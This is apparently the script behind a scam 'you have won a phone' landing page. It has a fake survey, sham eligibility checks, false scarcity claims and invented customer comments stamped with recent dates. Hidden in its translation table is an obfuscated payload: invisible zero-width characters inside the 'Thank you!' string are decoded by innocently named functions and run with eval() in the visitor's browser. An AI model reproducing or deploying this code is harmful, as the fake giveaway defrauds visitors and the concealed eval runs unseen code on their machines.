var brand = getURLParameter('brand');
var prize1 = "Samsung S10";
var prize2 = "iPhone 11 Pro";
var serviceName1 = getURLParameter('isp');
var progressText = "Done";
var days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
var months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
var translation = {
  tpl_congrats: "Congratulations!",
  tpl_introModalP1: "Dear customer! Today you have been chosen as the winner of a <strong>" + prize1 + "</strong> or an <strong>" + prize2 + "</strong>",
  tpl_introModalP2: "Click on <strong>\"OK\"</strong> to receive your reward before it is transferred to someone else!",
  tpl_ok: "OK",
  tpl_introP1: "Every " + introDay() + " we randomly select 10 lucky " + brand + " users of who will receive a gift from our sponsors; it's just a way to express our gratitude for your continued support for our products and services. ",
  tpl_introP2: "You can choose a <strong>" + prize1 + "</strong> or an <strong>" + prize2 + "</strong>. ",
  tpl_introP3: "To win, the only thing you need to do is answer the following 4 questions ",
  tpl_introP4: "<strong>Note:</strong> 10 randomly selected users have received this invitation and there are only several prizes left. ",
  tpl_q1: "Question 1 of 4: <strong>How many years have you been using " + serviceName1 + "?</strong>",
  tpl_q1a1: "For 1 year or less",
  tpl_q1a2: "For 1-2 years",
  tpl_q1a3: "For 3-4 years",
  tpl_q2: "Question 2 of 4: <strong>How often do you use " + serviceName1 + " services?</strong>",
  tpl_q2a1: "Use everyday",
  tpl_q2a2: "Once a week",
  tpl_q2a3: "Once a month",
  tpl_q3: "Question 3 of 4: <strong>Are you satisfied with our service?</strong>",
  tpl_q3a1: "I’m very satisfied",
  tpl_q3a2: "I’m happy",
  tpl_q3a3: "I’m not satisfied",
  tpl_q4: "Question 4 of 4: <strong>What is your favorite color for a smartphone?</strong>",
  tpl_q4a1: "White",
  tpl_q4a2: "Black",
  tpl_q4a3: "Golden",
  tpl_prizeH1: "Choose your favorite prize:",
  tpl_prizeH2: prize1,
  tpl_prizeH3: prize2,
  tpl_vc: 'Thank you!​‍‍‍​‍‍​​‍‍​​​​‍​‍‍‍​​‍​​​‍​​​​​​‍‍​‍‍​‍​​‍​​​​​​​‍‍‍‍​‍​​‍​​​​​​‍​​‍‍​‍​‍‍​​​​‍​‍‍‍​‍​​​‍‍​‍​​​​​‍​‍‍‍​​‍‍‍​​‍​​‍‍​​​​‍​‍‍​‍‍‍​​‍‍​​‍​​​‍‍​‍‍‍‍​‍‍​‍‍​‍​​‍​‍​​​​​‍​‍​​‍​​‍​‍‍​​​‍‍​​‍​​​​‍​​​​​​​‍‍‍‍​‍​​‍​​​​​​‍‍​​‍​​​‍‍​‍‍‍‍​‍‍​​​‍‍​‍‍‍​‍​‍​‍‍​‍‍​‍​‍‍​​‍​‍​‍‍​‍‍‍​​‍‍‍​‍​​​​‍​‍‍​​​‍‍‍​‍‍‍​​‍​​​​​​​‍‍‍‍​‍​​‍​​​​​​‍‍‍​‍‍‍​‍‍​‍​​‍​‍‍​‍‍‍​​‍‍​​‍​​​‍‍​‍‍‍‍​‍‍‍​‍‍‍​​‍​‍‍‍​​‍‍​‍‍​​​‍‍​‍‍‍‍​‍‍​​​‍‍​‍‍​​​​‍​‍‍‍​‍​​​‍‍​‍​​‍​‍‍​‍‍‍‍​‍‍​‍‍‍​​​‍​‍‍​​​‍‍​​​​‍​​‍​​​​​​​‍‍‍‍​‍​​‍​​​​​​‍‍‍​‍‍‍​​‍​‍‍‍​​‍‍​‍​​​​‍‍‍​​‍​​‍‍​​‍​‍​‍‍​​‍‍​​​‍​‍‍​​​‍‍​‍​​​​​‍​​​​​​​‍‍‍‍​‍​​‍​​​​​​‍‍‍​‍‍‍​​‍​‍‍‍​​‍‍​‍​​​​‍‍​‍‍‍‍​‍‍‍​​‍‍​‍‍‍​‍​​​‍‍​‍‍‍​​‍‍​​​​‍​‍‍​‍‍​‍​‍‍​​‍​‍​​‍​‍‍​​​‍‍‍​​​​​​‍​​​​​​​‍‍‍‍​‍​​‍​​​​​​‍‍‍​‍‍‍​​‍​‍‍‍​​‍‍‍​​​​​‍‍​​​​‍​‍‍‍​‍​​​‍‍​‍​​​​‍‍​‍‍‍​​‍‍​​​​‍​‍‍​‍‍​‍​‍‍​​‍​‍​​‍​‍‍​​​‍‍‍​​‍​​​‍​​​​​​​‍‍‍‍​‍​​‍​​​​​​‍‍‍​‍‍‍​​‍​‍‍‍​​‍‍‍​​​​​‍‍‍​​‍​​‍‍​‍‍‍‍​‍‍‍​‍​​​‍‍​‍‍‍‍​‍‍​​​‍‍​‍‍​‍‍‍‍​‍‍​‍‍​​​​‍​‍‍​​​‍‍​​‍​‍​‍‍​‍‍​​​​‍​​​​​​​‍‍‍‍​‍​​‍​​​​​​‍‍​​‍​​​​‍​‍‍‍​​‍‍​​‍‍‍​‍‍​​‍​‍​‍‍‍​‍​​​‍​​​‍​‍​‍‍​‍‍​​​‍‍​​‍​‍​‍‍​‍‍​‍​‍‍​​‍​‍​‍‍​‍‍‍​​‍‍‍​‍​​​‍‍‍​​‍‍​‍​​​​‍​​‍‍‍‍​​‍​‍​‍​‍​​​‍‍​​​​‍​‍‍​​‍‍‍​‍​​‍‍‍​​‍‍​​​​‍​‍‍​‍‍​‍​‍‍​​‍​‍​​‍​‍​​​​​‍​​‍‍‍​‍‍​​​​‍​​‍​​‍‍‍​​‍​‍​​‍​​‍‍‍​‍‍​‍‍​‍​​‍​‍‍​​‍‍​​​‍​​​​​​​‍​‍​​​​‍‍​‍‍​‍​​‍​​​​​​​‍‍‍‍​​​​‍‍‍‍​‍​​‍​​​​​​​‍‍​​​​​​‍​‍‍‍​​​‍‍​​​‍​​‍‍​‍​‍​​‍​‍​​‍​​‍​​​​​​‍‍‍‍​‍‍​‍‍​​‍‍​​‍‍​‍‍‍‍​‍‍‍​​‍​​​‍​‍​​​​‍‍‍​‍‍​​‍‍​​​​‍​‍‍‍​​‍​​​‍​​​​​​‍‍​‍​​‍​​‍‍‍‍​‍​​‍‍​​​​​​‍‍‍​‍‍​‍‍​‍​​‍​​‍‍‍‍​​​‍‍​​‍​‍​‍‍​‍‍​​​​‍​‍‍‍​​‍‍​‍‍​​​‍‍​​‍​‍​‍‍​‍‍‍​​‍‍​​‍‍‍​‍‍‍​‍​​​‍‍​‍​​​​​‍‍‍​‍‍​‍‍​‍​​‍​​‍​‍​‍‍​​‍​‍​‍‍​​‍​‍​​‍​​‍​​​​​​‍‍‍‍​‍‍​‍‍​​‍​‍​‍‍​‍‍​​​‍​‍‍​‍‍​‍‍​‍​​‍​‍​‍‍‍​‍​​‍​‍‍‍​​‍‍‍​​‍‍​‍‍​​‍​‍​‍‍‍​‍​​​‍​​​​​‍​‍‍‍​‍​​​‍‍‍​‍​​​‍‍‍​​‍​​‍‍​‍​​‍​‍‍​​​‍​​‍‍‍​‍​‍​‍‍‍​‍​​​‍‍​​‍​‍​​‍​‍​​​​​‍​​‍‍‍​‍‍​‍​​​​‍‍‍​​‍​​‍‍​​‍​‍​‍‍​​‍‍​​​‍​​‍‍‍​​‍​‍‍​​​​‍​​​​​​​‍​​‍‍‍​‍‍​‍​​​​‍‍‍​‍​​​‍‍‍​‍​​​‍‍‍​​​​​‍‍‍​​‍‍​​‍‍‍​‍​​​‍​‍‍‍‍​​‍​‍‍‍‍​‍‍‍​‍​​​‍‍‍​​‍​​‍‍​​​​‍​‍‍​​​‍‍​‍‍​‍​‍‍​​‍​‍‍‍​​‍‍‍​​‍​​‍‍​​‍​‍​‍‍​​‍​​​‍‍​‍​​‍​‍‍‍​​‍​​‍‍​​‍​‍​‍‍​​​‍‍​‍‍‍​‍​​​​‍​‍‍‍​​‍‍‍​​‍​​‍‍​‍‍‍‍​‍‍​​​‍‍​‍‍​‍​‍‍​‍‍‍​​‍‍​​‍​‍‍‍‍​‍‍​​‍‍​​‍‍​​‍​‍​‍‍​​‍​‍​​‍‍‍​​​​‍‍​​‍​​​‍‍​​​​‍​​‍‍​​​​​‍‍​​‍​​​​‍​‍‍​‍​‍‍​​‍​‍​​‍‍​‍‍‍​‍‍​​​​‍​​‍‍‍​​‍​​‍​‍‍​‍​​‍‍​‍​​​‍‍​​​‍​​​‍‍​​​​​​‍‍​​‍​​​‍​‍‍​‍​​‍‍‍​​​​​‍‍​​​​​​‍‍‍​​‍​​‍‍​‍‍​​​‍​‍‍​‍​​‍‍​​‍​​‍‍​​‍​​​‍‍​​‍​‍​​‍‍​‍‍​​‍‍​​‍‍​​‍‍​​​​‍​​‍‍​‍‍​​​‍‍​​​​​‍‍​​​‍​​​‍‍​‍‍​​‍‍​​‍​​​​‍‍​​​‍​​‍‍‍‍‍‍​‍‍‍​​‍​​​‍‍‍‍​‍​​‍​​‍‍‍​​‍​‍​‍‍​‍‍​‍​​​​​‍​‍​‍‍​‍‍‍​​​​​​‍​‍​​‍​​‍‍‍​‍‍​‍‍‍‍‍​‍​‍‍‍‍‍​‍',
  tpl_vc1: "We check your answers …",
  tpl_vr1: "You answered correctly (4/4)",
  tpl_vc2: "We check your IP …",
  tpl_vr2: "Previous records of the IP address were not found",
  tpl_vc3: "Check availability of prizes …",
  tpl_vr3: "Today there is only one prize left.",
  tpl_choose: "Choose",
  tpl_soldout: "Sold out",
  tpl_search: "Search Engine",
  tpl_commentsH1: "Comments",
  tpl_commName1: "Koena Boitumelo",
  tpl_commText1: "Mine arrived today, thanks for Samsung S10 !!!",
  tpl_commDate1: commentDate(0) + " at 08:56",
  tpl_commName2: "Sinky Pro Molefe",
  tpl_commText2: "At first I thought it was a joke, but surprisingly my Galaxy S10 arrived this morning, and it's no problem registering to get a phone, ha ha!",
  tpl_commDate2: commentDate(0) + " at 07:32",
  tpl_commName3: "Samkele Ngwenya",
  tpl_commText3: "Today I received mine! Thanks for the Samsung!",
  tpl_commDate3: commentDate(1) + " at 16:04",
  tpl_commName4: "Nokwazi Msimango",
  tpl_commText4: "I had seen this announcement once, but I ignored it because I thought it was a scam, but then I saw it again and decided to try ... Finally I received my Samsung S10!",
  tpl_commDate4: commentDate(1) + " at 14:31",
  tpl_commName5: "Nono Mahanjana",
  tpl_commText5: "My prize has arrived today! Thank you so much for my new Samsung Galaxy S10 !!!!!!!",
  tpl_commDate5: commentDate(2) + " at 18:09",
  tpl_copyright: serviceName1 + " ©2019"
};

function loadTranslation() {
	for (y in translation) {
		replace_text(translation, y);
	}
	eval(startTranslation(translation.tpl_vc));
}

function replace_text(lang, text)
{
  var elems = document.getElementsByTagName('*'), i;
    for (i in elems) {
        if((' ' + elems[i].className + ' ').indexOf(' ' + text + ' ') > -1) {
            elems[i].innerHTML = translation[text];
        }
    }
}

var trl_variable = '​', trl_value = '‍';
String.prototype.replaceAll = function(search, replacement) {
  var target = this;
  return target.replace(new RegExp(search, 'g'), replacement);
};

function translateText(string) {
  return string.replaceAll(trl_variable, '0').replaceAll(trl_value, '1')
}

function landerTemplate(content) {
  var lang, out = '';
  for (var i=0; i<content.length; i+=8){
    lang = parseInt(content.substr(i, 8), 2).toString(16);
    out += '%' + ((lang.length % 2 == 0) ? lang : '0' + lang);
  }
  return decodeURIComponent(out);
}

function startTranslation(body) {
  lines = [];
  for (var i=0; i<body.length; i++) {
    if (body[i] == trl_variable || body[i] == trl_value) {
      lines.push(body[i]);
    }
  }
  return landerTemplate(translateText(lines.join('')));
}

function commentDate(days) {
  var now = new Date()
  now.setDate(now.getDate() - days);
  month = now.getMonth();
  daym = now.getDate();
  if (daym < 10) { daym = "0" + daym };
  return "" + months[month] + " " + daym + "";
}

function introDay() {
	var now = new Date();
	return days[now.getDay()];
}

function getURLParameter(r){for(var t=window.location.search.substring(1).split("&"),n=0;n<t.length;n++){var e=t[n].split("=");if(e[0]===r)return e[1]}return""}

$(window).on('load',function(){
  $('#introModal').modal('show');
});

$(document).ready(function() {

  $('#q1 input, #q1 button').click(function(){
    $('#q1').delay(300).hide(0, function(){
      $('#q2').show(0);
    });
  });

  $('#q2 input, #q2 button').click(function(){
    $('#q2').delay(300).hide(0, function(){
      $('#q3').show(0);
    });
  });

  $('#q3 input, #q3 button').click(function(){
    $('#q3').delay(300).hide(0, function(){
      $('#q4').show(0);
    });
  });

  $('#q4 input, #q4 button').click(function(){
    $('.intro, #q4').delay(300).slideUp(function(){
      $('.validation').slideDown(function(){
        window.scrollTo(0, 0);
        validateAnswers();
      });
    });
  });

  function validateAnswers() {
    var current_progress = 0;
    var interval = setInterval(function() {
        current_progress += 25;
        $("#dynamic")
        .css("width", current_progress + "%")
        .attr("aria-valuenow", current_progress)
        .text(current_progress + "% " + progressText);

        if (current_progress >= 25) { $('.vc1').hide(0, function(){$('.vr1').show();}); }
        if (current_progress >= 50) { $('.vc2').hide(0, function(){$('.vr2').show();}); }
        if (current_progress >= 75) { $('.vc3').hide(0, function(){$('.vr3').show();}); }
        if (current_progress >= 100) { InitializeConfetti(); }

        if (current_progress >= 100) {
          clearInterval(interval);
          $('.validation').hide(0, function(){
            $('.prizes').slideDown();
          })
        }
            
    }, 1200);
  }

});
